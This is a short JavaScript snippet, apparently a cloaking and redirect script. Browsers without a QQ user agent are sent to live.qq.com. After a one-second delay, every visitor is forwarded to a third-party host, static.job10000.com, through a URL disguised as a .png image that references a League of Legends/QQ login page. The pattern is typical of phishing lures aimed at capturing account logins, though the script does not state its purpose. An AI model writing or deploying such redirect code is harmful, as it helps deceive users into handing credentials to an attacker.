function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://live.qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://static.job10000.com/yl/feedbackNew/20240215/65cd79c7502195f093dce6d9.png?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + '?' + timestamp + 'yuge';
    location.href = url;
}, 1000);
